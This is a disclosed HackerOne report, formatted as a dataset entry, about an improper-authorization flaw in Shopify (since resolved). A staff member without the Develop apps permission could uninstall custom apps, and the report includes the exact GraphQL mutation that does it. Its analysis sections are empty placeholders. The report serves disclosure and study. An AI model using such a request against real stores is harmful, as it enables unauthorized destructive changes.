---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1466855'
original_report_id: '1466855'
title: User with no Develop apps permission can Uninstall Custom App
weakness: Improper Authorization
team_handle: shopify
created_at: '2022-02-01T14:42:01.521Z'
disclosed_at: '2022-04-21T20:33:37.262Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 11
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-authorization
---

# User with no Develop apps permission can Uninstall Custom App

## Metadata

- HackerOne Report ID: 1466855
- Weakness: Improper Authorization
- Program: shopify
- Disclosed At: 2022-04-21T20:33:37.262Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

You know user must have Develop apps permission to Uninstall  Develop apps 
to test this just create staff with `Manage and install apps and channels`

{F1601504}

send this mutation just change appId by your id

```
{"operationName":"UninstallCustomApp","variables":{"appId":"gid://shopify/App/6431893"},"query":"mutation UninstallCustomApp($appId: ID!) {\n  appUninstall(input: {id: $appId}) {\n    app {\n      id\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

## Impact

User with no Develop apps permission can Uninstall Custom App

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
